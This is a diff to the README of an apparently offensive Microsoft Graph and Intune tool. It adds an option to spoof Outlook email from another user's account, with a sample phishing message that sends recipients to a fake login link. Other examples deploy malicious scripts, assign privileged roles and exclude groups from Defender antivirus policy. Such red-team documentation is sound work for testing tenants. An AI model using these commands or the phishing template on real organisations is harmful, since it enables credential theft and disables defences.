@@ -44,7 +44,7 @@ pip3 install -r requirements.txt
 usage: graphpython.py [-h] [--command COMMAND] [--list-commands] [--token TOKEN] [--estsauthcookie ESTSAUTHCOOKIE] [--use-cae] [--cert CERT] [--domain DOMAIN] [--tenant TENANT]
                       [--username USERNAME] [--secret SECRET] [--id ID] [--select SELECT] [--query QUERY] [--search SEARCH] [--entity {driveItem,message,chatMessage,site,event}]
                       [--device {mac,windows,androidmobile,iphone}] [--browser {android,IE,chrome,firefox,edge,safari}] [--only-return-cookies]
-                      [--mail-folder {allitems,inbox,archive,drafts,sentitems,deleteditems,recoverableitemsdeletions}] [--top TOP] [--script SCRIPT]
+                      [--mail-folder {allitems,inbox,archive,drafts,sentitems,deleteditems,recoverableitemsdeletions}] [--top TOP] [--script SCRIPT] [--email EMAIL]
 
 options:
   -h, --help            show this help message and exit
@@ -75,6 +75,7 @@ options:
                         Mail folder to dump (dump-owamailbox)
   --top TOP             Number (int) of messages to retrieve (dump-owamailbox)
   --script SCRIPT       File containing the script content (deploy-maliciousscript)
+  --email EMAIL         File containing OWA email message body content (spoof-owaemailmessage)
 
 examples:
   graphpython.py --command invoke-reconasoutsider --domain company.com
@@ -86,7 +87,7 @@ examples:
   graphpython.py --command invoke-search --search "credentials" --entity driveItem --token token
   graphpython.py --command invoke-customquery --query https://graph.microsoft.com/v1.0/sites/{siteId}/drives --token token
   graphpython.py --command assign-privilegedrole --token token
-  graphpython.py --command spoof-owaemailmessage [--id <userid to spoof>] --token token
+  graphpython.py --command spoof-owaemailmessage [--id <userid to spoof>] --token token --email email-body.txt
   graphpython.py --command get-manageddevices --token intune-token
   graphpython.py --command deploy-maliciousscript --script malicious.ps1 --token token
   graphpython.py --command add-exclusiongrouptopolicy --id <policyid> --token token
@@ -301,55 +302,34 @@ Options:
 1. Compromise an application with Mail.Send permission assigned then use `Spoof-OWAEmailMessage`
 2. Comprise user with Global Admin, Application Admin, Cloud Admin role or assign role to an existing owned user with `Assign-PrivilegedRole` -> then add password and Mail.Send permission to app -> auth as app service principal and use `Spoof-OWAEmailMessage`
 
-#### Example:
-```
-# graphpython.py --command spoof-owaemailmessage --token .\token --id useremail.tospoof@company.com
-```
-#### Output:
-```
-[*] Spoof-OWAEmailMessage
-================================================================================
+![](./.github/spoofowaemailcommand.png)
 
-Enter Subject: Spoofed subject
-Enter Body Content: Spoofed message content
-Enter toRecipients (comma-separated): target.user@company.com
-Enter ccRecipients (comma-separated): cc.user@company.com
-Save To Sent Items (true/false): false
+The content of `--email email.txt` for reference:
 
-[+] Email sent successfully
-================================================================================
 ```
+Morning,
+
+Please use following login for the devops portal whilst the main app is down:
+
+https://malicious/login
+
+Regards,
+
+MC 
+```
+> I've not tested any HTML or similar formatted emails but in theory anything that works in Outlook normally should render correctly if supplied via `--email`.
+
+Can see the email in the target users Outlook:
+
+![](./.github/spoofowaemail.png)
+
 
 ## Get-DeviceConfigurationPolicies
-#### Example:
-```
-# graphpython.py --command get-deviceconfigurationpolicies --token .\intune --select name,id,templateReference
-```
-#### Output:
-```
-[*] Get-DeviceConfigurationPolicies
-================================================================================
-id : de62414d-3a2f-4fcf-abdd-d9e1a56c034e
-name : ASR - Default Profile
-templateReference : {'templateId': 'e8c053d6-9f95-42b1-a7f1-ebfd71c67a4b_1', 'templateFamily': 'endpointSecurityAttackSurfaceReduction', 'templateDisplayName': 'Attack Surface Reduction Rules', 'templateDisplayVersion': 'Version 1'}
-assignmentTarget : {'@odata.type': '#microsoft.graph.allDevicesAssignmentTarget', 'deviceAndAppManagementAssignmentFilterId': None, 'deviceAndAppManagementAssignmentFilterType': 'none'}
 
-id : 2d555a7f-eefd-41f8-8429-a2a1c7532b49
-name : Bitlocker - profile
-templateReference : {'templateId': '46ddfc50-d10f-4867-b852-9434254b3bff_1', 'templateFamily': 'endpointSecurityDiskEncryption', 'templateDisplayName': 'BitLocker', 'templateDisplayVersion': 'Version 1'}
-assignmentTarget : {'@odata.type': '#microsoft.graph.allDevicesAssignmentTarget', 'deviceAndAppManagementAssignmentFilterId': None, 'deviceAndAppManagementAssignmentFilterType': 'none'}
+![](./.github/getdeviceconfigurationpolicies.png)
 
-
-id : b1076055-6074-4176-a561-08590c1793b0
-name : Defender - Policy
-templateReference : {'templateId': '804339ad-1553-4478-a742-138fb5807418_1', 'templateFamily': 'endpointSecurityAntivirus', 'templateDisplayName': 'Microsoft Defender Antivirus', 'templateDisplayVersion': 'Version 1'}
-assignmentTarget : {'@odata.type': '#microsoft.graph.allDevicesAssignmentTarget', 'deviceAndAppManagementAssignmentFilterId': None, 'deviceAndAppManagementAssignmentFilterType': 'none'}
-================================================================================
-```
 
 ## Display-AVPolicyRules
-
-> NOTE the `templateDisplayName` output in `Get-DeviceConfigurationPolicies` for use with Display-AVPolicyRules, Display-ASR...
 
 ![](./.github/displayavpolicyrules.png)
 
@@ -372,7 +352,7 @@ Verified creation and assignment options in Microsoft Intune admin center:
 ## Add-ExclusionGroupToPolicy
 #### Example:
 ```
-# graphpython.py --command display-avpolicyrules --id 0b98128f-d1ac-4a5a-9add-303d27ad5616 --token .\intune
+# graphpython.py --command display-avpolicyrules --id ced2b019-0cd7-4ef4-80ec-b0bde25bfda4 --token .\intune
 
 [*] Display-AVPolicyRules
 ================================================================================
@@ -383,7 +363,7 @@ Excluded processes : C:\WINDOWS\Explorer.EXE
 ```
 Add an exclusion group to the Microsoft Defender Antivirus exclusions policy above:
 ```
-# graphpython.py --command add-exclusiongrouptopolicy --id 0b98128f-d1ac-4a5a-9add-303d27ad5616 --token .\intune
+# graphpython.py --command add-exclusiongrouptopolicy --id ced2b019-0cd7-4ef4-80ec-b0bde25bfda4 --token .\intune
 
 [*] Add-ExclusionGroupToPolicy
 ================================================================================
@@ -395,18 +375,13 @@ Enter Group ID To Exclude: 46a6f18e-e243-492d-ae24-f5f301dd49bb
 ```
 #### Output:
 
-Verify the changes have been applied:
-```
-# graphpython.py --command get-deviceconfigurationpolicies --token .\intune --select id,name
+Verify the changes have been applied and Excluded Group ID has been added:
 
-[*] Get-DeviceConfigurationPolicies
-================================================================================
-id : 0b98128f-d1ac-4a5a-9add-303d27ad5616
-name : Defender Exclusions - Policy
-assignmentTarget : {'@odata.type': '#microsoft.graph.exclusionGroupAssignmentTarget', 'deviceAndAppManagementAssignmentFilterId': None, 'deviceAndAppManagementAssignmentFilterType': 'none', 'groupId': '46a6f18e-e243-492d-ae24-f5f301dd49bb'}
-assignmentTarget : {'@odata.type': '#microsoft.graph.allDevicesAssignmentTarget', 'deviceAndAppManagementAssignmentFilterId': None, 'deviceAndAppManagementAssignmentFilterType': 'none'}
 ```
-Note that assignmentTarget contains `exclusionGroupAssignmentTarget` and the supplied `'groupId': '46a6f18e-e243-492d-ae24-f5f301dd49bb'`
+graphpython.py --command get-deviceconfigurationpolicies --token .\intune
+```
+
+![](./.github/excludedgroupav.png)
 
 
 ## Remove-GroupMember
